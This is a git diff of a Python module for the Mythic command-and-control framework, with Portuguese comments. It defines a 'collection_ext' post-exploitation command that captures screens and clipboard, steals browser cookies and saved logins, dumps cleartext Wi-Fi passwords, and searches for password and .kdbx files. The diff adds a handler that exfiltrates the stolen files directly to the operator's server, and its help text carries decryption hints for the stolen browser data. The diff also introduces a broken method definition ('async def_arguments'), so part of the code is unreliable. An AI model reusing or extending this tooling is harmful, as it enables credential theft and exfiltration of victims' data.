@@ -1,6 +1,6 @@
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
-import json
+import json, base64
 
 
 class CollectionExtArguments(TaskArguments):
@@ -11,132 +11,137 @@ class CollectionExtArguments(TaskArguments):
                 name="action",
                 type=ParameterType.String,
                 parameter_group_info=[ParameterGroupInfo(required=False)],
-                description=("screenshot | clipboard | browser | search | stage | "
-                             "wifi | cleanup. Padrão: screenshot."),
+                description=(
+                    "screenshot | clipboard | browser | wifi | search | get | multiget. "
+                    "Padrão: screenshot."
+                ),
                 default_value="screenshot",
             ),
             CommandParameter(
                 name="path",
                 type=ParameterType.String,
                 parameter_group_info=[ParameterGroupInfo(required=False)],
-                description="(search/stage) raiz da busca. Vazio = perfil do usuário "
-                            "(ou todos os discos se all_drives=true).",
+                description="(search/get/multiget) caminho base ou arquivo exato.",
                 default_value="",
             ),
             CommandParameter(
                 name="exts",
                 type=ParameterType.String,
                 parameter_group_info=[ParameterGroupInfo(required=False)],
-                description="Extensões separadas por vírgula.",
+                description="(search/multiget) extensões separadas por vírgula.",
                 default_value=".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt",
             ),
             CommandParameter(
                 name="keywords",
                 type=ParameterType.String,
                 parameter_group_info=[ParameterGroupInfo(required=False)],
-                description="Palavras-chave no nome do arquivo (vírgula). Ex: senha,backup,vpn",
+                description="(search/multiget) palavras-chave no nome (vírgula).",
                 default_value="",
             ),
             CommandParameter(
                 name="browser",
                 type=ParameterType.String,
                 parameter_group_info=[ParameterGroupInfo(required=False)],
-                description="(action=browser) chrome | edge | firefox.",
+                description="(browser) chrome | edge | firefox.",
                 default_value="chrome",
             ),
             CommandParameter(
                 name="all_drives",
                 type=ParameterType.Boolean,
                 parameter_group_info=[ParameterGroupInfo(required=False)],
-                description="(search/stage) buscar em todos os discos locais.",
+                description="(search) varrer todos os discos locais.",
                 default_value=False,
             ),
             CommandParameter(
                 name="max_files",
                 type=ParameterType.Number,
                 parameter_group_info=[ParameterGroupInfo(required=False)],
-                description="Limite de arquivos por execução. Padrão: 200.",
+                description="Limite de arquivos. Padrão: 200.",
                 default_value=200,
             ),
             CommandParameter(
                 name="max_mb",
                 type=ParameterType.Number,
                 parameter_group_info=[ParameterGroupInfo(required=False)],
-                description="Limite total em MB (staging). Padrão: 50.",
+                description="(multiget) limite total em MB. Padrão: 50.",
                 default_value=50,
             ),
         ]
 
-    async def parse_arguments(self):
-        defaults = {
-            "action": "screenshot", "path": "", "exts":
-            ".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt", "keywords": "",
-            "browser": "chrome", "all_drives": False, "max_files": 200,
-            "max_mb": 50,
-        }
+    async def_arguments(self):
         if self.command_line:
-            if self.command_line.strip().startswith('{'):
+            if self.command_line.strip().startswith("{"):
                 d = json.loads(self.command_line)
-                for k, dv in defaults.items():
-                    t = ParameterType.Boolean if isinstance(dv, bool) else (
-                        ParameterType.Number if isinstance(dv, int) else None)
-                    if t:
-                        self.add_arg(k, d.get(k, dv), t)
-                    else:
-                        self.add_arg(k, d.get(k, dv))
+                self.add_arg("action",     d.get("action",     "screenshot"))
+                self.add_arg("path",       d.get("path",       ""))
+                self.add_arg("exts",       d.get("exts",       ".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt"))
+                self.add_arg("keywords",   d.get("keywords",   ""))
+                self.add_arg("browser",    d.get("browser",    "chrome"))
+                self.add_arg("all_drives", d.get("all_drives", False), ParameterType.Boolean)
+                self.add_arg("max_files",  d.get("max_files",  200), ParameterType.Number)
+                self.add_arg("max_mb",     d.get("max_mb",     50),  ParameterType.Number)
             else:
+                # Posicional: [action] [path]
                 parts = self.command_line.strip().split()
                 self.add_arg("action",     parts[0] if len(parts) > 0 else "screenshot")
                 self.add_arg("path",       parts[1] if len(parts) > 1 else "")
-                for k, dv in defaults.items():
-                    if k in ("action", "path"):
-                        continue
-                    t = ParameterType.Boolean if isinstance(dv, bool) else (
-                        ParameterType.Number if isinstance(dv, int) else None)
-                    if t:
-                        self.add_arg(k, dv, t)
-                    else:
-                        self.add_arg(k, dv)
+                self.add_arg("exts",       ".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt")
+                self.add_arg("keywords",   "")
+                self.add_arg("browser",    "chrome")
+                self.add_arg("all_drives", False, ParameterType.Boolean)
+                self.add_arg("max_files",  200, ParameterType.Number)
+                self.add_arg("max_mb",     50,  ParameterType.Number)
         else:
-            for k, dv in defaults.items():
-                t = ParameterType.Boolean if isinstance(dv, bool) else (
-                    ParameterType.Number if isinstance(dv, int) else None)
-                if t:
-                    self.add_arg(k, dv, t)
-                else:
-                    self.add_arg(k, dv)
+            self.add_arg("action",     "screenshot")
+            self.add_arg("path",       "")
+            self.add_arg("exts",       ".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt")
+            self.add_arg("keywords",   "")
+            self.add_arg("browser",    "chrome")
+            self.add_arg("all_drives", False, ParameterType.Boolean)
+            self.add_arg("max_files",  200, ParameterType.Number)
+            self.add_arg("max_mb",     50,  ParameterType.Number)
 
 
 class CollectionExtCommand(CommandBase):
     cmd         = "collection_ext"
     needs_admin = False
-    help_cmd    = "collection_ext {\"action\":\"<ação>\", ...}"
+    help_cmd    = (
+        "collection_ext [action] [path]\n"
+        "collection_ext {\"action\":\"<acao>\", ...}"
+    )
     description = (
-        "Collection (MITRE TA0009) no host do agente.\n\n"
+        "Collection (MITRE TA0009) no host do agente — todo o conteúdo é "
+        "exfiltrado DIRETO para o Mythic (nada fica no alvo).\n\n"
         "Ações:\n"
-        "  screenshot          captura todas as telas (T1113)\n"
-        "  clipboard           dump do clipboard texto/imagem (T1115)\n"
-        "  browser             history/bookmarks/Cookies/Login Data de\n"
-        "                      chrome/edge/firefox (T1005/T1555.003)\n"
-        "  search              busca arquivos por extensão/palavra-chave (T1005)\n"
-        "  stage               search + copia p/ %TEMP%\\anubis_stage e gera ZIP (T1074)\n"
-        "  wifi                SSIDs e senhas Wi-Fi em claro (T1005)\n"
-        "  cleanup             remove o diretório de staging\n\n"
+        "  screenshot : captura a tela virtual (T1113) -> PNG no Mythic\n"
+        "  clipboard  : texto/imagem do clipboard (T1115) -> output/PNG no Mythic\n"
+        "  browser    : History/Bookmarks/Cookies/Login Data de chrome/edge/\n"
+        "               firefox (T1005/T1555.003) -> arquivos no Mythic\n"
+        "  wifi       : SSIDs e senhas Wi-Fi em claro (T1005) -> output\n"
+        "  search     : lista arquivos por extensão/palavra-chave (T1005) -> output\n"
+        "  get        : exfiltra 1 arquivo exato (T1005) -> arquivo no Mythic\n"
+        "  multiget   : exfiltra vários arquivos por critério com limites de\n"
+        "               MB/quantidade (T1005) -> arquivos no Mythic\n\n"
         "Exemplos:\n"
         "  collection_ext {\"action\":\"screenshot\"}\n"
+        "  collection_ext {\"action\":\"clipboard\"}\n"
         "  collection_ext {\"action\":\"browser\",\"browser\":\"chrome\"}\n"
+        "  collection_ext {\"action\":\"wifi\"}\n"
         "  collection_ext {\"action\":\"search\",\"path\":\"C:\\\\Users\\\\\",\n"
         "                  \"keywords\":\"senha,vpn,kdbx\"}\n"
-        "  collection_ext {\"action\":\"stage\",\"exts\":\".docx,.pdf,.kdbx\",\n"
-        "                  \"max_mb\":100,\"all_drives\":true}\n\n"
-        "Detecção:\n"
-        "  EID 4688 (Compress-Archive/copy), Sysmon 11 (file create no %TEMP%),\n"
-        "  4688 netsh wlan, PowerShell 4104 (CopyFromScreen/GetClipboard)"
+        "  collection_ext {\"action\":\"get\",\"path\":\"C:\\\\Users\\\\a\\\\backup.kdbx\"}\n"
+        "  collection_ext {\"action\":\"multiget\",\"exts\":\".kdbx,.rdp\",\"max_mb\":20}\n\n"
+        "Posicional: collection_ext get C:\\Users\\a\\senhas.txt\n\n"
+        "Notas:\n"
+        "  Cookies/Login Data do Chrome/Edge são cifrados (DPAPI+AES-GCM) —\n"
+        "  decriptar no operador. Firefox logins.json+key4.db decripta offline.\n\n"
+        "Detecção no alvo:\n"
+        "  EID 4688 (powershell.exe), PS 4104 (CopyFromScreen/GetClipboard),\n"
+        "  4688 netsh wlan key=clear, Sysmon 11 (arquivo temporário breve)"
     )
     version               = 1
     author                = "@wtechsec"
-    attackmapping         = ["T1005", "T1074.001", "T1074.002", "T1113", "T1115",
-                             "T1555.003"]
+    attackmapping         = ["T1005", "T1113", "T1115", "T1555.003"]
     supported_ui_features = []
     argument_class        = CollectionExtArguments
     attributes            = CommandAttributes(
@@ -151,23 +156,79 @@ class CollectionExtCommand(CommandBase):
             TaskID=taskData.Task.ID,
             Success=True,
         )
+
         action = taskData.args.get_arg("action") or "screenshot"
-        extra = ""
+        path   = taskData.args.get_arg("path")   or ""
+        extra  = ""
+
         if action == "browser":
-            extra = " (%s)" % (taskData.args.get_arg("browser") or "chrome")
-        elif action in ("search", "stage"):
-            p = taskData.args.get_arg("path") or ""
-            extra = " %s%s%s" % (
-                p or ("<todos os discos>" if taskData.args.get_arg("all_drives")
-                      else "<perfil do usuário>"),
-                ("/kw:%s" % taskData.args.get_arg("keywords"))
-                if taskData.args.get_arg("keywords") else "",
-                ("/drive-wide" if taskData.args.get_arg("all_drives") else ""),
-            )
-        response.DisplayParams = "%s%s" % (action, extra)
+            extra = " {}".format(taskData.args.get_arg("browser") or "chrome")
+        elif action in ("search", "get", "multiget"):
+            where = path or ("<todos os discos>" if taskData.args.get_arg("all_drives")
+                             else "<perfil do usuário>")
+            kw = taskData.args.get_arg("keywords") or ""
+            extra = " {}{}".format(where, " kw:{}".format(kw) if kw else "")
+
+        response.DisplayParams = "{}{}".format(action, extra)
         return response
 
     async def process_response(
         self, task: PTTaskMessageAllData, response: any
     ) -> PTTaskProcessResponseMessageResponse:
-        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
+        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
+
+        raw = ""
+        if response is not None:
+            raw = response.decode() if isinstance(response, (bytes, bytearray)) \
+                  else str(response)
+
+        # ── Parsing do JSON do agente ─────────────────────────────────────────
+        output, err, files = "", "", []
+        try:
+            d = json.loads(raw)
+            output = d.get("output", "")
+            err    = d.get("err", "")
+            files  = d.get("files", []) or []
+        except (json.JSONDecodeError, ValueError):
+            output = raw  # agente retornou texto puro
+
+        # ── Texto → output da task (mesmo canal do winrm_ext) ────────────────
+        text = "\n".join(x for x in (output, err) if x)
+        if text:
+            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                TaskID=task.Task.ID,
+                Response=text.encode()
+            ))
+
+        # ── Arquivos → exfiltração direta pro Mythic ─────────────────────────
+        for f in files:
+            name = f.get("name", "unknown")
+            try:
+                contents = base64.b64decode(f.get("b64", ""))
+                if not contents:
+                    raise ValueError("b64 vazio")
+                fr = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
+                    TaskID=task.Task.ID,
+                    Filename=name,
+                    FileContents=contents,
+                    DeleteAfterFetch=False,
+                ))
+                if fr.Success:
+                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                        TaskID=task.Task.ID,
+                        Response=("[+] Exfiltrado: {} ({} bytes) — disponível na "
+                                  "task/file browser\n".format(
+                                      name, len(contents))).encode()
+                    ))
+                else:
+                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                        TaskID=task.Task.ID,
+                        Response=("[!] Falha ao registrar {} no Mythic: {}\n".format(
+                            name, fr.Error)).encode()
+                    ))
+            except Exception as e:
+                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                    TaskID=task.Task.ID,
+                    Response=("[!] Erro exfiltrando {}: {}\n".format(name, str(e))).encode()
+                ))
+        return resp
